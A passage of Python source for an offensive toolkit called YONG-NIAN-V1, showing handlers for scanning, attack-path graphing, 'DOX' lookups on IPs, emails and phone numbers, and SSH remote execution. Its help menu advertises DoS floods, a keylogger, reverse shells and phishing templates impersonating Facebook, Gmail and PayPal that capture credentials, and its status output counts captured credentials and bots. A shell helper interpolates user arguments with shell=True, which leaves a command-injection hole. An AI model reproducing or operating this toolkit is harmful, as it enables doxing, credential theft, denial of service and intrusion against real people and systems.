    
    def _apk_permissions(self, args):
        if not self.apk:
            return {'success': False, 'output': 'APK analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: apk_permissions <apk_path>'}
        
        result = self.apk.analyze_apk(args[0])
        if not result.get('success'):
            return {'success': False, 'output': f"Error: {result.get('error')}"}
        
        perms = result.get('permissions', [])
        output = f"🔐 Permissions in {args[0]} ({len(perms)} found):\n"
        for perm in perms:
            output += f"  • {perm}\n"
        
        return {'success': True, 'output': output}
    
    def _apk_activities(self, args):
        if not self.apk:
            return {'success': False, 'output': 'APK analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: apk_activities <apk_path>'}
        
        result = self.apk.analyze_apk(args[0])
        if not result.get('success'):
            return {'success': False, 'output': f"Error: {result.get('error')}"}
        
        activities = result.get('activities', [])
        output = f"📱 Activities in {args[0]} ({len(activities)} found):\n"
        for act in activities:
            output += f"  • {act}\n"
        
        return {'success': True, 'output': output}
    
    def _apk_decompile(self, args):
        if not self.apk:
            return {'success': False, 'output': 'APK analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: apk_decompile <apk_path>'}
        
        output = f"🔧 APK Decompilation: {args[0]}\n"
        output += "=" * 50 + "\n"
        output += "Note: For full decompilation, use apktool or jadx\n"
        output += "Commands:\n"
        output += f"  apktool d {args[0]} -o {APK_ANALYSIS_DIR}/decompiled\n"
        output += f"  jadx -d {APK_ANALYSIS_DIR}/jadx {args[0]}\n"
        
        return {'success': True, 'output': output}
    
    # Attack Path methods (Dijkstra)
    def _attack_path(self, args):
        if not self.attack_path:
            return {'success': False, 'output': 'Attack path engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: attack_path <target_ip>'}
        
        target = args[0]
        
        # Build graph from scan
        scan_result = self.tools.nmap(target, 'quick')
        
        # Parse open ports
        open_ports = []
        for line in scan_result.output.split('\n'):
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 2 and 'open' in line:
                    port = int(parts[0].split('/')[0])
                    service = parts[2] if len(parts) > 2 else 'unknown'
                    open_ports.append({'port': port, 'service': service})
        
        # Clear and rebuild graph
        self.attack_path.clear()
        self.attack_path.build_from_scan_results(target, {'open_ports': open_ports})
        
        # Find shortest path
        entry_id = f"entry_{target}"
        target_id = f"target_{target}"
        
        path = self.attack_path.dijkstra(entry_id, target_id)
        
        if not path:
            return {'success': False, 'output': f"No attack path found to {target}"}
        
        output = f"🛤️ Shortest Attack Path to {target}\n"
        output += "=" * 50 + "\n"
        output += f"Total Weight: {path.total_weight:.2f}\n"
        output += f"Path Length: {len(path.nodes)} nodes\n\n"
        
        output += "Path:\n"
        for i, node_id in enumerate(path.nodes):
            node = self.attack_path.nodes.get(node_id)
            if node:
                output += f"  {i+1}. {node.name}"
                if node.port:
                    output += f" (port {node.port})"
                output += f" [risk: {node.risk_score:.1f}]\n"
            
            if i < len(path.edges):
                edge = path.edges[i]
                output += f"     └─> {edge.exploit_type}: {edge.description}\n"
        
        # Save path
        self.db.save_attack_path(target, json.dumps({
            'nodes': path.nodes,
            'total_weight': path.total_weight
        }), path.total_weight, len(path.nodes), True)
        
        return {'success': True, 'output': output}
    
    def _attack_graph(self, args):
        if not self.attack_path:
            return {'success': False, 'output': 'Attack path engine not initialized'}
        
        stats = self.attack_path.get_graph_statistics()
        output = "🕸️ Attack Graph Statistics\n"
        output += "=" * 40 + "\n"
        output += f"Total Nodes: {stats['nodes']}\n"
        output += f"Total Edges: {stats['edges']}\n"
        output += f"Entry Points: {stats['entry_points']}\n"
        output += f"Vulnerabilities: {stats['vulnerabilities']}\n"
        output += f"Targets: {stats['targets']}\n"
        
        if self.attack_path.nodes:
            output += "\nNodes:\n"
            for node_id, node in list(self.attack_path.nodes.items())[:20]:
                output += f"  • {node.name} ({node.node_type})\n"
        
        return {'success': True, 'output': output}
    
    def _attack_add_node(self, args):
        if not self.attack_path:
            return {'success': False, 'output': 'Attack path engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: attack_add_node <id> <name> <type> [ip] [port]'}
        
        node = AttackNode(
            id=args[0],
            name=args[1],
            node_type=args[2],
            ip=args[3] if len(args) > 3 else '',
            port=int(args[4]) if len(args) > 4 else 0,
            risk_score=5.0
        )
        self.attack_path.add_node(node)
        return {'success': True, 'output': f"Node added: {args[0]}"}
    
    def _attack_add_edge(self, args):
        if not self.attack_path:
            return {'success': False, 'output': 'Attack path engine not initialized'}
        if len(args) < 4:
            return {'success': False, 'output': 'Usage: attack_add_edge <source> <target> <weight> <exploit_type>'}
        
        self.attack_path.add_edge(args[0], args[1], float(args[2]), args[3])
        return {'success': True, 'output': f"Edge added: {args[0]} -> {args[1]}"}
    
    def _attack_all_paths(self, args):
        if not self.attack_path:
            return {'success': False, 'output': 'Attack path engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: attack_all_paths <start> <end> [max_depth]'}
        
        start = args[0]
        end = args[1]
        max_depth = int(args[2]) if len(args) > 2 else 10
        
        paths = self.attack_path.find_all_paths(start, end, max_depth)
        
        if not paths:
            return {'success': False, 'output': f"No paths found from {start} to {end}"}
        
        output = f"🛤️ All Attack Paths from {start} to {end}\n"
        output += "=" * 50 + "\n"
        output += f"Found {len(paths)} paths\n\n"
        
        for i, path in enumerate(paths[:10]):
            output += f"Path {i+1} (weight: {path.total_weight:.2f}):\n"
            output += f"  {' -> '.join(path.nodes)}\n\n"
        
        return {'success': True, 'output': output}
    
    def _attack_clear(self, args):
        if not self.attack_path:
            return {'success': False, 'output': 'Attack path engine not initialized'}
        
        self.attack_path.clear()
        return {'success': True, 'output': 'Attack graph cleared'}
    
    # LLM methods
    def _llm(self, args):
        if not self.llm:
            return {'success': False, 'output': 'LLM not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: llm <question>'}
        
        question = ' '.join(args)
        result = self.llm.query(question)
        
        if result.get('success'):
            return {'success': True, 'output': result.get('response', '')}
        return {'success': False, 'output': 'LLM query failed'}
    
    def _llm_analyze(self, args):
        if not self.llm:
            return {'success': False, 'output': 'LLM not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: llm_analyze <target_or_data>'}
        
        target = ' '.join(args)
        question = f"Analyze the security posture of {target} and provide recommendations."
        result = self.llm.query(question)
        
        if result.get('success'):
            return {'success': True, 'output': result.get('response', '')}
        return {'success': False, 'output': 'LLM query failed'}
    
    # IP Management methods
    def _add_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        domain = NetworkTools.ip_to_domain(args[0])
        try:
            ipaddress.ip_address(args[0])
            if self.db.add_managed_ip(args[0], domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {args[0]} added (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {args[0]}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {args[0]}'}
    
    def _remove_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (args[0],))
        self.db.conn.commit()
        return {'success': True, 'output': f'✅ IP {args[0]} removed'}
    
    def _list_ips(self, args):
        ips = self.db.get_managed_ips()
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip.get('is_blocked') else "🟢"
            output += f"  {status} {ip['ip_address']} ({ip.get('domain', 'Unknown')})\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        try:
            ipaddress.ip_address(args[0])
            db_info = self.db.conn.execute("SELECT * FROM managed_ips WHERE ip_address = ?", (args[0],)).fetchone()
            location = NetworkTools.location(args[0])
            domain = NetworkTools.ip_to_domain(args[0])
            
            output = f"🔍 IP Information: {args[0]}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {args[0]}'}
    
    def _analyze_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = NetworkTools.ip_to_domain(ip)
        
        output = f"🔷 YONG-NIAN-V1 IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n" + ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n" + nmap_result.output[:1000] + "\n\n"
        
        return {'success': True, 'output': output}
    
    def _scan_ips(self, args):
        ips = self.db.get_managed_ips()
        if not ips:
            return {'success': True, 'output': 'No managed IPs to scan'}
        
        output = f"🔄 Scanning {len(ips)} managed IPs...\n"
        results = []
        
        for ip_data in ips:
            ip = ip_data['ip_address']
            result = self.tools.nmap(ip, 'quick')
            
            vulns = []
            if 'open' in result.output.lower():
                vulns.append({'type': 'open_ports', 'description': 'Open ports detected'})
            
            status = "⚠️" if vulns else "✅"
            results.append(f"  {status} {ip} - {len(vulns)} vulnerabilities")
        
        output += "\n".join(results)
        return {'success': True, 'output': output}
    
    def _mass_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: mass_scan <network> [ports]'}
        
        network = args[0]
        ports = args[1] if len(args) > 1 else self.config.get('mass_scanning.default_ports', '21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017')
        
        try:
            net = ipaddress.ip_network(network, strict=False)
            hosts = list(net.hosts())
            
            output = f"🔍 Mass Scanning {len(hosts)} hosts on network {network}...\n"
            output += f"Ports: {ports}\n\n"
            
            alive = 0
            results = []
            
            for ip in hosts[:100]:
                ping_result = self.tools.ping(str(ip), 1)
                if ping_result.success:
                    alive += 1
                    results.append(f"  🟢 {ip} is alive")
            
            output += f"Alive hosts: {alive}/{min(100, len(hosts))}\n"
            output += "\n".join(results[:20])
            
            if len(results) > 20:
                output += f"\n... and {len(results) - 20} more"
            
            return {'success': True, 'output': output}
        except Exception as e:
            return {'success': False, 'output': f'Error: {e}'}
    
    # Network methods
    def _whois(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        return self._generic(f'whois {args[0]}')
    
    def _dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [type]'}
        record_type = args[1] if len(args) > 1 else 'A'
        return self._generic(f'dig {args[0]} {record_type} +short')
    
    def _dig(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        return self._generic(f'dig {args[0]}')
    
    def _nslookup(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        return self._generic(f'nslookup {args[0]}')
    
    def _location(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.location(args[0])
        if result.get('success'):
            output = f"📍 Location for {args[0]}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {args[0]}"}
    
    def _scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _ip_to_domain(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        domain = NetworkTools.ip_to_domain(args[0])
        if domain:
            return {'success': True, 'output': f"Domain for IP {args[0]}: {domain}"}
        return {'success': False, 'output': f"No domain found for IP {args[0]}"}
    
    def _domain_to_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        ip = NetworkTools.domain_to_ip(args[0])
        if ip:
            return {'success': True, 'output': f"IP for domain {args[0]}: {ip}"}
        return {'success': False, 'output': f"No IP found for domain {args[0]}"}
    
    # DOX methods
    def _dox_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dox_ip <ip>'}
        ip = args[0]
        location = self.tools.location(ip)
        domain = NetworkTools.ip_to_domain(ip)
        
        dox_data = {
            'ip': ip,
            'domain': domain,
            'location': location if location.get('success') else None
        }
        
        self.db.save_dox(ip, dox_data, 'ip_lookup')
        
        output = f"🔷 DOX Results for IP {ip}:\n"
        output += "=" * 40 + "\n"
        if domain:
            output += f"🌐 Domain: {domain}\n"
        if location.get('success'):
            output += f"📍 Country: {location.get('country')}\n"
            output += f"🏙️ City: {location.get('city')}\n"
            output += f"📡 ISP: {location.get('isp')}\n"
        
        return {'success': True, 'output': output}
    
    def _dox_domain(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dox_domain <domain>'}
        domain = args[0]
        ip = NetworkTools.domain_to_ip(domain)
        
        dox_data = {
            'domain': domain,
            'ip': ip
        }
        
        self.db.save_dox(domain, dox_data, 'domain_lookup')
        
        output = f"🔷 DOX Results for domain {domain}:\n"
        output += "=" * 40 + "\n"
        output += f"📡 IP: {ip or 'Unknown'}\n"
        
        return {'success': True, 'output': output}
    
    def _dox_email(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dox_email <email>'}
        email = args[0]
        
        dox_data = {
            'email': email,
            'domain': email.split('@')[-1] if '@' in email else None
        }
        
        self.db.save_dox(email, dox_data, 'email_lookup')
        
        output = f"🔷 DOX Results for email {email}:\n"
        output += "=" * 40 + "\n"
        output += f"🌐 Domain: {dox_data['domain'] or 'Unknown'}\n"
        
        return {'success': True, 'output': output}
    
    def _dox_phone(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dox_phone <phone>'}
        phone = args[0]
        
        dox_data = {
            'phone': phone,
            'country': 'Unknown'
        }
        
        self.db.save_dox(phone, dox_data, 'phone_lookup')
        
        output = f"🔷 DOX Results for phone {phone}:\n"
        output += "=" * 40 + "\n"
        output += f"📞 Phone: {phone}\n"
        
        return {'success': True, 'output': output}
    
    def _dox_list(self, args):
        entries = self.db.get_dox_entries()
        if not entries:
            return {'success': True, 'output': 'No DOX entries found'}
        output = "🔷 DOX Entries:\n"
        for e in entries[:20]:
            output += f"  • {e['target']} - {e['source']} - {e['created_at'][:19]}\n"
        return {'success': True, 'output': output}
    
    # System methods
    def _status(self, args):
        stats = self.db.get_statistics()
        output = f"""
🔷 YONG-NIAN-V1 System Status
{'='*50}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Bots: {stats.get('total_bots', 0)} ({stats.get('online_bots', 0)} online)
  DOX Entries: {stats.get('total_dox', 0)}
  Binary Analyses: {stats.get('total_binary_analyses', 0)}
  APK Analyses: {stats.get('total_apk_analyses', 0)}
  Attack Paths: {stats.get('total_attack_paths', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {NetworkTools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args):
        limit = int(args[0]) if args and args[0].isdigit() else 20
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args):
        output = f"""
💻 System Information
{'='*50}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args):
        limit = int(args[0]) if args and args[0].isdigit() else 10
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _stats(self, args):
        return self._status(args)
    
    def _clear(self, args):
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _version(self, args):
        return {'success': True, 'output': f"YONG-NIAN-V1 v{VERSION}\nAuthor: {AUTHOR}\n{NAME} - Ultimate Penetration Testing Platform"}
    
    def _generic(self, command: str) -> Dict:
        """Execute generic shell command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args) -> Dict:
        """Show help menu"""
        help_text = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.SECONDARY}         🤖 YONG-NIAN-V1 v{VERSION} - HELP MENU                       {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}📡 PING COMMANDS (30+):{Colors.RESET}
║  ping <target> [count]         - Basic ping
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep network
║  fping <targets...>            - Fast ping multiple
║  ping_flood <target>           - Flood ping
║  ping_mtu <target> <size>      - Ping with MTU
║  ping_size <target> <size>     - Ping with size
║  ping_count <target> <count>   - Ping with count
║  ping_interval <target> <sec>  - Ping with interval
║  ping_timeout <target> <sec>   - Ping with timeout
║  ping_ttl <target> <ttl>       - Ping with TTL
║
║{Colors.SUCCESS}🗺️ TRACEROUTE COMMANDS (35+):{Colors.RESET}
║  traceroute <target>           - Basic traceroute
║  traceroute6 <target>          - IPv6 traceroute
║  traceroute_tcp <target>       - TCP traceroute
║  traceroute_udp <target>       - UDP traceroute
║  traceroute_icmp <target>      - ICMP traceroute
║  traceroute_max_hops <t> <n>   - Max hops
║  traceroute_first_hop <t> <n>  - First hop
║  traceroute_queries <t> <n>    - Queries per hop
║  traceroute_wait <t> <sec>     - Wait time
║  traceroute_port <t> <port>    - Port
║  mtr <target>                  - MTR
║  mtr_report <target>           - MTR report
║  mtr_json <target>             - MTR JSON
║  mtr_csv <target>              - MTR CSV
║  tcptraceroute <target>        - TCP traceroute
║  lft <target>                  - Layer Four Traceroute
║  tracepath <target>            - Tracepath
║  pathping <target>             - Pathping
║
║{Colors.SUCCESS}🔍 NMAP COMMANDS (80+):{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan
║  nmap_os <target>              - OS detection
║  nmap_service <target>         - Service detection
║  nmap_udp <target>             - UDP scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth scan
║  nmap_ping <target>            - Ping scan
║  nmap_ports <t> <ports>        - Port range
║  nmap_script <t> <script>      - NSE script
║  nmap_aggressive <target>      - Aggressive scan
║  nmap_smb <target>             - SMB scan
║  nmap_snmp <target>            - SNMP scan
║  nmap_ssh <target>             - SSH scan
║  nmap_http <target>            - HTTP scan
║
║{Colors.SUCCESS}🌐 CURL COMMANDS (80+):{Colors.RESET}
║  curl <url>                    - Basic request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_put <url> <data>         - PUT request
║  curl_delete <url>             - DELETE request
║  curl_head <url>               - HEAD request
║  curl_location <url>           - Follow redirects
║  curl_verbose <url>            - Verbose
║  curl_header <url> <header>    - Custom header
║  curl_user_agent <url> <ua>    - User agent
║  curl_user <url> <user:pass>   - Basic auth
║  curl_proxy <url> <proxy>      - Proxy
║  curl_json <url> <json>        - JSON POST
║  curl_health <url>             - Health check
║  curl_benchmark <url> <n>      - Benchmark
║  curl_loadtest <url> <c> <d>   - Load test
║
║{Colors.SUCCESS}⬇️ WGET COMMANDS (70+):{Colors.RESET}
║  wget <url>                    - Basic download
║  wget_output <url> <file>      - Output file
║  wget_continue <url>           - Resume
║  wget_recursive <url>          - Recursive
║  wget_mirror <url>             - Mirror
║  wget_spider <url>             - Spider
║  wget_header <url> <header>    - Custom header
║  wget_user_agent <url> <ua>    - User agent
║  wget_cookies <url> <file>     - Load cookies
║  wget_limit_rate <url> <rate>  - Limit rate
║  wget_timeout <url> <sec>      - Timeout
║  wget_no_check_cert <url>      - Skip SSL
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS (25+):{Colors.RESET}
║  netcat <host> <port>          - Basic netcat
║  nc_listen <port>              - Listen mode
║  nc_scan <host> <ports>        - Port scan
║  nc_transfer <host> <port> <file> - Transfer
║  nc_shell <host> <port>        - Shell
║  nc_reverse <host> <port>      - Reverse shell
║  nc_banner <host> <port>       - Banner grab
║  nc_udp <host> <port>          - UDP mode
║
║{Colors.SUCCESS}🔒 SSH COMMANDS (15+):{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH
║  ssh_list                      - List SSH
║  ssh_connect <conn_id>         - Connect
║  ssh_exec <conn_id> <command>  - Execute
║  ssh_disconnect <conn_id>      - Disconnect
║  ssh_upload <conn_id> <l> <r>  - Upload file
║  ssh_download <conn_id> <r> <l>- Download file
║  ssh_tunnel <lport> <rh> <rp>  - Local tunnel
║
║{Colors.SUCCESS}💥 DOS/DDOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <dur> [threads] - SYN flood
║  dos_udp <ip> <port> <dur> [threads] - UDP flood
║  dos_http <ip> <port> <dur> [threads] - HTTP flood
║  dos_icmp <ip> <dur> [threads] - ICMP flood
║  dos_stop [id]                 - Stop attack
║
║{Colors.SUCCESS}⌨️ KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start (F10 stop)
║  keylogger_stop                - Stop
║  keylogger_status              - Status
║  keylogger_logs [limit]        - View logs
║  keylogger_screenshots         - Screenshots
║
║{Colors.SUCCESS}🎣 PHISHING TEMPLATES (100+):{Colors.RESET}
║  phish_facebook                - Facebook
║  phish_instagram               - Instagram
║  phish_twitter                 - Twitter/X
║  phish_gmail                   - Gmail
║  phish_microsoft               - Microsoft
║  phish_paypal                  - PayPal
║  phish_amazon                  - Amazon
║  phish_netflix                 - Netflix
║  phish_templates               - List all templates
║  phish_custom <name>           - Custom phishing page
║  phish_start <id> [port]       - Start server
║  phish_stop                    - Stop server
║  phish_creds [id]              - View credentials
║  phish_shorten <url>           - Shorten URL
║
║{Colors.SUCCESS}🔬 BINARY ANALYSIS:{Colors.RESET}
║  binary_analyze <file>         - Full binary analysis
║  binary_strings <file>         - Extract strings
║  binary_disassemble <file>     - Disassemble
║  binary_imports <file>         - Show imports
║  binary_exports <file>         - Show exports
║
║{Colors.SUCCESS}📱 APK ANALYSIS:{Colors.RESET}
║  apk_analyze <file>            - Full APK analysis
║  apk_permissions <file>        - Show permissions
║  apk_activities <file>         - Show activities
║  apk_decompile <file>          - Decompile APK
║
║{Colors.SUCCESS}🛤️ ATTACK PATH (Dijkstra):{Colors.RESET}
║  attack_path <target>          - Find shortest attack path
║  attack_graph                  - Show attack graph
║  attack_add_node <id> <name> <type> [ip] [port] - Add node
║  attack_add_edge <src> <dst> <weight> <exploit> - Add edge
║  attack_all_paths <start> <end> - Find all paths
║  attack_clear                  - Clear graph
║
║{Colors.SUCCESS}🤖 LLM INTEGRATION:{Colors.RESET}
║  llm <question>                - Ask cybersecurity question
║  llm_analyze <target>          - Analyze target security
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP
║  remove_ip <ip>                - Remove IP
║  list_ips [active]             - List IPs
║  ip_info <ip>                  - IP information
║  analyze_ip <ip>               - Complete analysis
║  scan_ips                      - Scan all managed IPs
║  mass_scan <network> [ports]   - Mass scan network
║
║{Colors.SUCCESS}🌐 NETWORK COMMANDS:{Colors.RESET}
║  whois <domain>                - WHOIS lookup
║  dns <domain> [type]           - DNS lookup
║  dig <domain>                  - Dig DNS
║  nslookup <domain>             - NSLookup
║  location <ip>                 - IP geolocation
║  scan <target>                 - Quick port scan
║
║{Colors.SUCCESS}🔷 DOX COMMANDS:{Colors.RESET}
║  dox_ip <ip>                   - DOX an IP address
║  dox_domain <domain>           - DOX a domain
║  dox_email <email>             - DOX an email
║  dox_phone <phone>             - DOX a phone number
║  dox_list                      - List DOX entries
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System info
║  threats [limit]               - Recent threats
║  clear                         - Clear screen
║  version                       - Version
║  help                          - This help
║
║{Colors.ACCENT}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# ============================================================
# SSH MANAGER
# ============================================================
class SSHManager:
    """SSH connection manager"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        """Add SSH connection"""
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.now().isoformat()
        )
        self.db.save_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        """Connect to SSH server"""
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            logger.error(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        """Disconnect SSH"""
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        """Execute command over SSH"""
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        """Get all SSH connections"""
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# ============================================================
# MAIN APPLICATION
# ============================================================
class YongNianV1:
    """Main application class for YONG-NIAN-V1"""
    
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        
        # Initialize engines
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.dos = DOSEngine(self.db, self.config)
        self.keylogger = KeyloggerModule(self.db, self.config) if KEYLOGGER_AVAILABLE else None
        self.attack_path = DijkstraAttackPathEngine(self.db)
        self.binary = BinaryAnalysisEngine(self.db)
        self.apk = APKAnalysisEngine(self.db)
